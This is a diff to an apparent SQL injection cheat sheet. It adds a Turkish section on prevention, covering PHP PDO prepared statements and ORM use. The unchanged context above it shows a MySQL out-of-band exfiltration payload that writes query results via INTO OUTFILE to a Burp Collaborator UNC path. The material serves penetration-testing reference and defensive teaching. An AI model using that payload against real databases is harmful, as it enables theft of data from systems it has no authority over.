@@ -433,3 +433,19 @@ MySQL:
 SELECT YOUR-QUERY-HERE 
 INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a';
 ```
+
+# SQL Injection Önleme Yöntemleri
+Parametrik Sorgular (Prepared Statements) Kullan
+- Kullanıcı girdisini SQL sorgusunun bir parçası olarak birleştirme. Bunun yerine sorguyu ve parametreleri ayrı gönder.
+
+Örnek (PHP PDO):
+```php
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$username]);
+```
+
+ORM (Object-Relational Mapping) Tercih Et
+- Doctrine, Eloquent, SQLAlchemy gibi ORM kütüphaneleri, SQL Injection riskini azaltır.
+- Direkt olarak string birleştirme yerine model fonksiyonlarını kullan.
+
+
